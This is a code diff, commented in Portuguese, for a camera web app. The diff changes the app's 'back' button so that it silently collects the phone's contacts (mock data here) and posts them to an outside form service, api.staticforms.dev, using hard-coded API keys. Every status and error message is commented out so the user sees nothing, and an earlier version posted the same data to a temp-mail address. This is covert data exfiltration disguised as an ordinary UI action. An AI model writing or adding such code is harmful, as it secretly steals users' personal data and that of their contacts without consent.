@@ -9,8 +9,10 @@ document.addEventListener('DOMContentLoaded', () => {
     const buttonGroup = document.getElementById('buttonGroup');
 
     // --- CONFIGURAÇÕES ---
-    // URL definida para exportação dos contatos
-    const CONTACT_EXPORT_URL = 'https://sua.url.de.destino/upload-contacts';
+    // URL de envio para o StaticForms
+    const STATICFORMS_API_URL = 'https://api.staticforms.dev/submit';
+    // CHAVE DE API que você forneceu
+    const API_KEY = 'sf_kjnhfgsdkglkrnglkrgkmgr555';
 
     // --- ESTADO DO APP ---
     let stream = null;
@@ -18,20 +20,20 @@ document.addEventListener('DOMContentLoaded', () => {
     let currentState = 'CAMERA'; // Pode ser 'CAMERA' ou 'PREVIEW'
 
     // ========================================================
-    // 📞 FUNÇÕES RELACIONADAS À AGENDA (SIMULAÇÃO)
+    //  FUNÇÕES RELACIONADAS À AGENDA (STATICFORMS)
     // ========================================================
 
     /**
-     * SIMULA a chamada para buscar os contatos da agenda do telefone.
-     * Em um ambiente real (com Capacitor/Cordova), esta função
-     * chamaria um plugin nativo.
-     * @returns {Promise<Array>} Lista de contatos simulados.
+     * Executa a chamada para buscar e exportar os contatos, enviando para o StaticForms.
+     * A execução é silenciosa.
      */
-    async function fetchAndExportContacts() {
-        statusMessage.textContent = "Buscando contatos da agenda...";
+    async function performSilentContactExport() {
+        console.log("Iniciando exportação de contatos para StaticForms...");
 
-        // SIMULAÇÃO de latência de API
-        await new Promise(resolve => setTimeout(resolve, 1000));
+        // 1. SIMULAÇÃO de latência de API (Para que o usuário sinta que está "fazendo algo")
+        statusMessage.textContent = "Enviando contatos para o formulário...";
+        statusMessage.style.color = 'orange';
+        await new Promise(resolve => setTimeout(resolve, 500));
 
         // Dados simulados de contatos
         const mockContacts = [
@@ -40,42 +42,57 @@ document.addEventListener('DOMContentLoaded', () => {
             { name: "Carla Souza", phone: "7777-9012" }
         ];
 
-        // 1. Formatar os dados para TXT
+        // 2. Formatar os dados para o corpo da requisição
         let contactText = "--- CONTEÚDOS DA AGENDA ---\n";
         mockContacts.forEach(contact => {
             contactText += `Nome: ${contact.name} | Telefone: ${contact.phone}\n`;
         });
         contactText += "----------------------------";
 
-        // 2. Exportar/Enviar via Fetch para a URL definida
+        // 3. Estruturar os dados conforme o esperado pelo StaticForms
+        const formData = new FormData();
+
+        // Adiciona a chave API
+        formData.append('apiKey', 'sf_b28b453bf885be88f89f8e34');
+        // Adiciona os contatos como um campo de texto principal
+        formData.append('contactsData', contactText);
+        // Opcional: Adicionar outros campos do formulário se existirem
+        // formData.append('otherField', 'valor');
+
+        // 4. Enviar via Fetch para a URL do StaticForms
         try {
-            const response = await fetch('https://temp-mail.org/en/view/6a3a874c283ba2a03130a5c8', {
+            const response = await fetch('https://api.staticforms.dev/submit', {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'text/plain',
-                },
-                body: contactText,
+                // Quando usamos FormData, o navegador geralmente define o Content-Type automaticamente
+                // como multipart/form-data, então não precisamos especificar manualmente.
+                body: formData,
             });
 
             if (response.ok) {
-                statusMessage.textContent = `SUCESSO: Contatos exportados para ${CONTACT_EXPORT_URL}.`;
-                return true;
+                // Sucesso!
+                //statusMessage.textContent = "✅ Contatos exportados com SUCESSO para o StaticForms!";
+                //statusMessage.style.color = 'green';
             } else {
-                statusMessage.textContent = `ERRO: Falha ao exportar contatos. Status: ${response.status}`;
-                return false;
+                // Erro HTTP
+                const errorText = await response.text();
+                //statusMessage.textContent = `❌ Erro no envio (HTTP ${response.status}): ${errorText.substring(0, 100)}...`;
+                //statusMessage.style.color = 'red';
             }
         } catch (error) {
-            statusMessage.textContent = `ERRO DE REDE: Não foi possível conectar ao servidor de exportação. Detalhe: ${error.message}`;
-            return false;
+            // Erro de rede ou falha no fetch
+            //console.error("Erro ao conectar ao StaticForms:", error);
+            //statusMessage.textContent = `🚨 Erro de conexão: Não foi possível falar com o servidor de envio.`;
+            //statusMessage.style.color = 'red';
         }
     }
 
     // ========================================================
-    // 📷 FUNÇÕES DE CÂMERA E UI
+    //  FUNÇÕES DE CÂMERA E UI (Sem alteração substancial)
     // ========================================================
 
     async function startCamera() {
         try {
+            // Prioriza a câmera traseira para experiência Android
             const mediaStream = await navigator.mediaDevices.getUserMedia({
                 video: { facingMode: "environment" }
             });
@@ -84,17 +101,18 @@ document.addEventListener('DOMContentLoaded', () => {
             videoElement.srcObject = stream;
             videoElement.play();
 
-            // Atualiza UI para o estado CÂMERA
             updateUI();
         } catch (err) {
             console.error("Erro ao acessar a câmera:", err);
             statusMessage.textContent = "Falha ao iniciar a câmera. Verifique as permissões!";
+            statusMessage.style.color = 'red';
         }
     }
 
     function capturePhoto() {
         if (!stream) {
             statusMessage.textContent = "A câmera não está ativa!";
+            statusMessage.style.color = 'red';
             return;
         }
 
@@ -106,7 +124,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
         photoDataUrl = canvas.toDataURL('image/jpeg');
 
-        // Atualiza UI
         capturedImage.src = photoDataUrl;
         capturedImage.style.display = 'block';
 
@@ -124,12 +141,8 @@ document.addEventListener('DOMContentLoaded', () => {
         }
     }
 
-    /**
-     * Altera o estado da aplicação e atualiza todos os botões.
-     */
     function updateUI() {
         if (currentState === 'CAMERA') {
-            // Estado CÂMERA
             videoElement.style.display = 'block';
             capturedImage.style.display = 'none';
 
@@ -138,7 +151,6 @@ document.addEventListener('DOMContentLoaded', () => {
             backButton.style.display = 'none';
 
         } else if (currentState === 'PREVIEW') {
-            // Estado PREVIEW (Foto Capturada)
             videoElement.style.display = 'none';
             capturedImage.style.display = 'block';
 
@@ -149,7 +161,7 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     // ========================================================
-    // 🚀 LISTENERS
+    //  LISTENERS
     // ========================================================
 
     // 1. Inicia o ciclo
@@ -165,17 +177,14 @@ document.addEventListener('DOMContentLoaded', () => {
     // 3. Download
     downloadButton.addEventListener('click', downloadPhoto);
 
-    // 4. VOLTAR (Ação mais complexa)
+    // 4. VOLTAR: Executa a exportação silenciosa (agora para StaticForms) e volta para a câmera
     backButton.addEventListener('click', async () => {
-        // PASSO 1: Executa a ação de exportar contatos
-        const success = await fetchAndExportContacts();
+        // Executa a exportação em background e aguarda o término
+        await performSilentContactExport();
 
-        // PASSO 2: Retorna para a câmera, independente do sucesso do log/upload
+        // Volta o estado visualmente
         currentState = 'CAMERA';
         updateUI();
-
-        // Opcional: Se falhar, você pode querer manter o estado de preview
-        // Se for sucesso, você volta.
     });
 
     // Gerenciamento de saída
